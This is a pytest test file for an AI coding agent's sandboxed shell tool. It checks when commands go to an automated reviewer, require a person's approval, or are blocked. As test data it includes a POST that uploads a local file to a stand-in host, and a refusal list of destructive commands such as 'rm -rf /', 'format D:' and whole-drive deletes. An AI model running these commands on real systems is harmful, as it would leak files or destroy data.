@pytest.mark.skipif(os.name != "nt", reason="the shell tool routes Git this way on Windows only")
def test_a_refused_configuration_change_says_what_it_needs(tmp_path):
    from alysis_code.tools.shell import shell_run

    class Runner(WindowsMxcRunner):
        def run(self, **kwargs):
            code = 0 if "--get" in kwargs["cmd"] else 255
            return subprocess.CompletedProcess(kwargs["cmd"], code, "", "")

    refused = shell_run(root=tmp_path, cmd="git config user.name Someone", runner=Runner(CLOSED))
    assert refused["sandbox_policy"]["git_metadata"] == "protected"
    assert "permissions.git_metadata=true" in refused["sandbox_policy"]["guidance"]
    read = shell_run(root=tmp_path, cmd="git config --get user.name", runner=Runner(CLOSED))
    assert "sandbox_policy" not in read
    # A failed read gets the same note, which therefore only says "if".
    assert "If it was meant to change them" in refused["sandbox_policy"]["guidance"]
    other = shell_run(root=tmp_path, cmd="python tool.py", runner=Runner(CLOSED))
    assert "sandbox_policy" not in other


# ---- background commands ----------------------------------------------------


def _background(harness, command, manager, **kwargs):
    return harness.run(command, tool="shell_background", manager=manager, **kwargs)


@pytest.mark.parametrize(
    "runner",
    [
        WindowsMxcRunner(CLOSED),
        LazyBackgroundShellRunner(lambda: WindowsMxcRunner(CLOSED), settings=CLOSED),
    ],
)
def test_background_command_in_the_sandbox_needs_no_person_card(harness, runner):
    manager = _Manager(runner)
    caught = _background(harness, "python server.py", manager)
    assert isinstance(caught, AgentRuntimeError) and "captured start" in str(caught)
    assert manager.started == ["python server.py"]
    assert not _person_cards(harness.surface, "shell_background")


@pytest.mark.parametrize(
    "runner",
    [
        None,
        object(),
        WindowsNativeRunner(CLOSED),
        WindowsMxcRunner(replace(CLOSED, network="on")),
        LazyBackgroundShellRunner(lambda: WindowsMxcRunner(CLOSED)),  # settings not captured
        LazyBackgroundShellRunner(
            lambda: WindowsMxcRunner(CLOSED), settings=replace(CLOSED, network="on")
        ),
    ],
)
def test_background_runner_that_is_not_this_sandbox_keeps_the_person(harness, runner):
    manager = _Manager(runner)
    assert isinstance(_background(harness, "python server.py", manager), ApprovalDeclinedError)
    assert not manager.started
    (card,) = _person_cards(harness.surface, "shell_background")
    assert card.metadata["always_ask_person"]


def test_durable_service_keeps_the_person(harness):
    """A durable service is started by another manager with its own settings."""
    manager = _Manager(WindowsMxcRunner(CLOSED))
    caught = _background(harness, "python server.py", manager, persist=True)
    assert isinstance(caught, ApprovalDeclinedError)
    assert not manager.started


def test_lazy_background_runner_reports_without_loading():
    loaded: list[int] = []
    runner = LazyBackgroundShellRunner(lambda: loaded.append(1), settings=CLOSED)
    assert runner.execution_settings is CLOSED and runner.resolved_runner is None
    assert not loaded
    assert LazyBackgroundShellRunner(lambda: None).execution_settings is None


# ---- verification -----------------------------------------------------------


@pytest.fixture
def verify_harness(tmp_path, monkeypatch):
    """verify_run through the real guard, with the verification runner captured."""
    from alysis_code.config import AppConfig

    root = tmp_path / "project"
    root.mkdir()
    monkeypatch.setenv("ALYSIS_CONFIG_DIR", str(tmp_path / "config"))
    monkeypatch.setenv("ALYSIS_MEMORY_HOME", str(tmp_path / "memory"))
    monkeypatch.setenv("ALYSIS_TERMINAL_OWNERSHIP_DIR", str(tmp_path / "terminal"))
    state = {"settings": CLOSED}
    choice = SimpleNamespace(backend="windows-mxc", requires_command_approval=False)
    for target in ("alysis_code.agent.tools_assembly", "alysis_code.verify_gate"):
        monkeypatch.setattr(f"{target}.resolve_shell_sandbox_settings", lambda _: state["settings"])
    for target in ("alysis_code.agent.tools_assembly", "alysis_code.sandbox_runner"):
        monkeypatch.setattr(f"{target}.select_shell_sandbox_backend", lambda _: choice)
    ran: list[str] = []

    class Runner:
        def run(self, *, root, cwd, cmd, timeout_s, cancel_check=None):
            ran.append(cmd)
            return subprocess.CompletedProcess(cmd, 0, "ok\n", "")

    monkeypatch.setattr(
        "alysis_code.verify_gate.build_shell_runner_from_settings", lambda *a, **k: Runner()
    )
    reviewer, _client, store = _reviewer(root, [], user_message="Run the checks")
    surface = _Surface(allow=False)

    def run(command, *, mode="auto", settings=None):
        if settings is not None:
            state["settings"] = settings
        tool = build_tools(
            root=root,
            console=Console(file=io.StringIO()),
            surface=surface,
            store=store,
            mode=mode,
            yes=True,
            cfg=AppConfig(model="test-model"),
            shell_runner=WindowsMxcRunner(state["settings"]),
            runtime_kind=RuntimeKind.INTERACTIVE_CHAT,
            approval_reviewer=reviewer,
        )["verify_run"]
        try:
            tool.run({"commands": [command]})
        except (ApprovalDeclinedError, AgentRuntimeError) as caught:
            return caught
        return None

    return SimpleNamespace(run=run, surface=surface, ran=ran)


@pytest.mark.parametrize(
    "command",
    [
        "pytest -q",
        "npm test",
        # Verification never sends Git to the job with writable metadata: these
        # run as ordinary commands, where the repository cannot be changed.
        "git diff --exit-code",
        "git commit -m x",
    ],
)
@pytest.mark.parametrize("mode", ["auto", "fullaccess"])
def test_sandboxed_verification_command_needs_no_person_card(verify_harness, command, mode):
    assert verify_harness.run(command, mode=mode) is None
    assert verify_harness.ran == [command]
    assert not [r for r in verify_harness.surface.requests if r.kind == "verify_run"]


@pytest.mark.parametrize(
    "settings",
    [replace(CLOSED, network="on"), replace(CLOSED, preview_access="local")],
)
def test_verification_under_launcher_networking_keeps_the_person(verify_harness, settings):
    assert isinstance(verify_harness.run("pytest -q", settings=settings), ApprovalDeclinedError)
    assert not verify_harness.ran
    (card,) = [r for r in verify_harness.surface.requests if r.kind == "verify_run"]
    assert card.metadata["always_ask_person"]


# ---- the checks that follow the mode read PowerShell as PowerShell ------------
#
# In cmd.exe `a; b` is one command; in PowerShell it is two. These checks ran
# after the mandatory card and were never reached for a sandboxed command.


@pytest.mark.parametrize(
    "command",
    [
        "echo ok; python build.py",
        "cd .; npm run deploy",
        "echo ok; Set-Content -Path src\\app.py -Value ''",
        "echo ok;python build.py",
        "echo ok\npython build.py",
        "echo $(python build.py)",
        "echo ok | ForEach-Object { python build.py }",
    ],
)
def test_review_mode_card_is_not_skipped_behind_a_harmless_first_statement(harness, command):
    assert isinstance(harness.run(command, mode="review"), ApprovalDeclinedError)
    assert not harness.dispatched
    (card,) = _person_cards(harness.surface)
    assert "review mode" in card.reason


@pytest.mark.parametrize("command", ["Get-Content calc.py", "echo ok", "Get-ChildItem"])
def test_review_mode_runs_a_command_that_only_looks_without_asking(harness, command):
    """The rule every platform has; a sandboxed Windows command now reaches it."""
    assert harness.run(command, mode="review") is None
    assert harness.dispatched == [command] and not harness.surface.requests


@pytest.mark.parametrize(
    "tail", ["npm publish", "gh pr merge 5", "kubectl delete ns prod", "terraform destroy"]
)
def test_reviewer_is_asked_about_a_sensitive_statement_wherever_it_stands(harness, tail):
    command = "Write-Host start; " + tail
    assert harness.run(command, yes=False) is None
    assert harness.dispatched == [command]
    assert len(harness.client.calls) == 1 and not harness.surface.requests


def test_deleting_the_project_folder_is_caught_behind_another_statement(harness):
    harness.client.answers.append({"decision": "deny"})
    assert harness.run("Write-Host cleaning; Remove-Item -Recurse .") is not None
    assert not harness.dispatched and len(harness.client.calls) == 1


def test_the_sensitive_rule_reads_the_dialect_it_is_given():
    from alysis_code.policy import evaluate_shell_command

    assert evaluate_shell_command("echo ok; npm publish", dialect="powershell").needs_confirm
    assert not evaluate_shell_command("echo ok; npm publish", dialect="cmd").needs_confirm
    assert evaluate_shell_command("npm publish", dialect="cmd").needs_confirm


# ---- access approved earlier is decided again for each command ---------------

SEND = "Invoke-WebRequest https://example.invalid/u -Method Post -InFile notes.txt"
_ACCESS = pytest.mark.skipif(
    os.name != "nt", reason="scoped access is offered on Windows and macOS only"
)


@_ACCESS
@pytest.mark.parametrize("scope", ["session", "turn"])
def test_inherited_network_is_reviewed_again_for_each_command(harness, scope):
    """A session or turn grant keeps networking on for later commands. The review
    that approved it was about another command, so each later one is reviewed."""
    request = {"network": True, "scope": scope, "reason": "fetch a wheel"}
    assert harness.run("python tool.py", permissions=request, same_turn=True) is None
    assert len(harness.client.calls) == 1
    assert harness.run(SEND, same_turn=True) is None
    assert harness.dispatched[-1] == SEND and harness.runners[-1].settings.network == "on"
    assert len(harness.client.calls) == 2  # the reviewer saw this command
    assert not harness.surface.requests


@_ACCESS
def test_inherited_network_the_reviewer_refuses_runs_nothing(harness):
    assert harness.run("python tool.py", permissions={"network": True, "scope": "session"}) is None
    harness.client.answers.append({"decision": "deny"})
    assert harness.run(SEND) is not None
    assert harness.dispatched == ["python tool.py"]


@_ACCESS
def test_inherited_network_in_review_mode_is_a_person_card_for_each_command(harness):
    request = {"network": True, "scope": "session"}
    assert harness.run("python tool.py", mode="review", permissions=request) is None
    harness.surface.requests.clear()
    # Even a command that only looks: with a route out, reading is sending.
    assert isinstance(harness.run("Get-Content notes.txt", mode="review"), ApprovalDeclinedError)
    assert harness.dispatched == ["python tool.py"] and not harness.client.calls
    (card,) = harness.surface.requests
    assert card.kind == "shell_run" and "approved earlier" in card.reason
    assert not card.metadata.get("always_ask_person")


@_ACCESS
def test_inherited_network_is_reviewed_for_a_background_command_too(harness):
    assert harness.run("python tool.py", permissions={"network": True, "scope": "session"}) is None
    manager = _Manager(WindowsMxcRunner(CLOSED))
    caught = harness.run("python beacon.py", tool="shell_background", manager=manager)
    assert isinstance(caught, AgentRuntimeError) and "captured start" in str(caught)
    assert manager.started == ["python beacon.py"]
    assert len(harness.client.calls) == 2 and not harness.surface.requests


@_ACCESS
def test_a_saved_profile_is_reviewed_for_the_command_that_applies_it(harness):
    harness.surface.request_approval = lambda request: (
        harness.surface.requests.append(request) or ApprovalDecision(True)
    )
    saved = {"network": True, "save_as": "net", "reason": "install"}
    assert harness.run("python tool.py", permissions=saved) is None
    assert [r.kind for r in harness.surface.requests] == ["sandbox_access"]  # a person saved it
    harness.surface.requests.clear()
    calls = len(harness.client.calls)
    assert harness.run(SEND, permissions={"profile": "net"}) is None
    assert len(harness.client.calls) == calls + 1 and not harness.surface.requests


@_ACCESS
def test_folders_approved_for_the_session_are_not_reviewed_again(harness, tmp_path):
    """An approved folder is part of the boundary. It opens no route out, so a
    later command inside the same boundary follows the mode."""
    docs = tmp_path / "docs"
    docs.mkdir()
    request = {"read_folders": [str(docs)], "scope": "session"}
    assert harness.run("python tool.py", permissions=request) is None
    calls = len(harness.client.calls)
    assert harness.run("python other.py") is None
    assert str(docs) in harness.runners[-1].settings.windows_read_roots
    assert len(harness.client.calls) == calls and not harness.surface.requests


# ---- a Git directory the sandbox cannot write-protect -------------------------


def _git_directory(folder):
    for name in ("hooks", "objects", "refs"):
        (folder / name).mkdir(parents=True)
    (folder / "HEAD").write_text("ref: refs/heads/main\n")
    (folder / "config").write_text("[core]\n\tbare = false\n")
    return folder


def test_an_approved_folder_inside_the_git_directory_keeps_the_person(tmp_path):
    from alysis_code.windows_sandbox import git_directory_left_writable, pointed_git_directories

    root = tmp_path / "project"
    root.mkdir()
    store = _git_directory(tmp_path / "store" / "repo")
    (root / ".git").write_text(f"gitdir: {store.as_posix()}\n")
    assert not git_directory_left_writable(root, CLOSED)  # outside every approved folder
    for approved in (store, store / "hooks"):
        settings = replace(CLOSED, additional_workspace_roots=(str(approved),))
        assert git_directory_left_writable(root, settings), approved
        protect, unprotected = pointed_git_directories([root.resolve(), approved.resolve()])
        assert protect == [] and unprotected == [store.resolve()]


def test_a_git_file_that_names_the_project_folder_keeps_the_person(tmp_path):
    from alysis_code.git_safe import separate_git_directories
    from alysis_code.windows_sandbox import git_directory_left_writable, pointed_git_directories

    root = _git_directory(tmp_path / "project")
    (root / ".git").write_text("gitdir: .\n")
    assert git_directory_left_writable(root, CLOSED)
    # Never write-protected: that would stop every write in the project.
    assert pointed_git_directories([root.resolve()]) == ([], [root.resolve()])
    assert separate_git_directories(root, name_rule=False) == ()  # other callers are unchanged


# ---- a forced recursive delete is decided, not refused ----------------------

CONTAINED_DELETES = [
    "Remove-Item -Recurse -Force .\\build",
    "Remove-Item -LiteralPath node_modules -Recurse -Force",
    "Write-Host cleaning; ri -r -fo dist",
    "rm -r -fo dist",  # the alias: read as this spelling, not as the POSIX rm rule
    "cmd /c rd /s /q build",
]


@pytest.mark.parametrize("command", CONTAINED_DELETES)
def test_reviewer_decides_a_forced_recursive_delete_in_the_sandbox(harness, command):
    """Refused outright before, also after a person had approved the command."""
    assert harness.run(command) is None
    assert harness.dispatched == [command]
    assert len(harness.client.calls) == 1 and not harness.surface.requests


def test_a_forced_recursive_delete_is_reviewed_even_with_yes(harness):
    harness.client.answers.append({"decision": "deny"})
    assert harness.run(CONTAINED_DELETES[0], yes=True) is not None
    assert not harness.dispatched and len(harness.client.calls) == 1


def test_a_forced_recursive_delete_cannot_be_allowed_for_the_session(harness):
    """What the folder holds changes; allowing the text once says nothing about later."""
    harness.run(CONTAINED_DELETES[0], mode="review")
    (card,) = _person_cards(harness.surface)
    assert card.allow_for_session_scope is None
    # The reviewer may still answer it in "Approve for me": nothing forces a person.
    for flag in ("always_ask_person", "mandatory_explicit_approval", "allow_for_session_disabled"):
        assert not card.metadata.get(flag)


def test_a_forced_recursive_delete_is_decided_again_the_next_time(harness):
    assert harness.run(CONTAINED_DELETES[0]) is None
    assert harness.run(CONTAINED_DELETES[0], same_turn=True) is None
    assert harness.dispatched == [CONTAINED_DELETES[0]] * 2
    assert len(harness.client.calls) == 2 and not harness.surface.requests


@pytest.mark.skipif(os.name != "nt", reason="scoped access is offered on Windows and macOS only")
def test_access_reviewed_for_the_same_command_does_not_decide_its_delete(harness):
    """The access review answered whether the command may use the network."""
    permissions = {"network": True, "reason": "fetch and clean"}
    assert harness.run(CONTAINED_DELETES[0], permissions=permissions) is None
    assert harness.dispatched == [CONTAINED_DELETES[0]]
    assert len(harness.client.calls) == 2  # one for the access, one for the delete
    harness.client.answers.extend([{"decision": "allow"}, {"decision": "deny"}])
    assert harness.run(CONTAINED_DELETES[1], permissions=permissions) is not None
    assert harness.dispatched == [CONTAINED_DELETES[0]]


def test_a_person_decides_a_forced_recursive_delete_in_review_mode(harness):
    assert isinstance(harness.run(CONTAINED_DELETES[0], mode="review"), ApprovalDeclinedError)
    assert not harness.dispatched and not harness.client.calls
    (card,) = _person_cards(harness.surface)
    assert card.reason.startswith("Recursive delete (Remove-Item -Recurse -Force)")
    assert "approved folders" in card.reason


@pytest.mark.parametrize(
    "command",
    [
        "Remove-Item -Recurse -Force C:\\",
        "Remove-Item -Recurse -Force $HOME",
        "Remove-Item -Recurse -Force C:\\Users\\someone",
        "format D:",
        "powershell -EncodedCommand AAAA",
        "rm -rf /",
    ],
)
@pytest.mark.parametrize("mode", ["auto", "review"])
def test_what_no_sandbox_makes_acceptable_stays_refused(harness, command, mode):
    refused = harness.run(command, mode=mode)
    assert isinstance(refused, AgentRuntimeError) and str(refused).startswith("Blocked ")
    assert not harness.dispatched and not harness.client.calls and not harness.surface.requests


@pytest.mark.parametrize(
    "runner",
    [
        HostShellRunner(),
        WindowsNativeRunner(CLOSED),
        WindowsMxcRunner(replace(CLOSED, network="on")),
        LazyShellRunner(lambda: HostShellRunner()),
    ],
    ids=["host", "legacy-helper", "launcher-network", "lazy-host"],
)
def test_a_forced_recursive_delete_outside_this_sandbox_stays_refused(harness, runner):
    """The boundary is what makes it a question; without it the refusal stands."""
    settings = getattr(runner, "settings", None)
    refused = harness.run(
        CONTAINED_DELETES[0], runner=runner, settings=settings if settings else None
    )
    assert refused is not None and not harness.dispatched
    assert "Blocked command" in str(refused) or isinstance(refused, ApprovalDeclinedError)
    assert not harness.client.calls


def test_a_forced_recursive_delete_with_an_unprobed_helper_stays_refused(harness, monkeypatch):
    monkeypatch.setattr("alysis_code.windows_mxc_containment.PROBED_SECURITY_REVISION", 10)
    refused = harness.run(CONTAINED_DELETES[0])
    assert refused is not None and not harness.dispatched and not harness.client.calls


def test_deleting_the_project_folder_by_force_asks_as_it_does_without_force(harness):
    harness.client.answers.append({"decision": "deny"})
    assert harness.run("Remove-Item -Recurse -Force .") is not None
    assert not harness.dispatched and len(harness.client.calls) == 1
    assert "deletes the project folder" in str(harness.client.calls[0])


def test_a_forced_recursive_delete_in_a_background_command_is_decided_too(harness):
    manager = _Manager(WindowsMxcRunner(CLOSED))
    harness.run(CONTAINED_DELETES[0], tool="shell_background", manager=manager)
    assert manager.started == [CONTAINED_DELETES[0]]
    assert len(harness.client.calls) == 1 and not harness.surface.requests
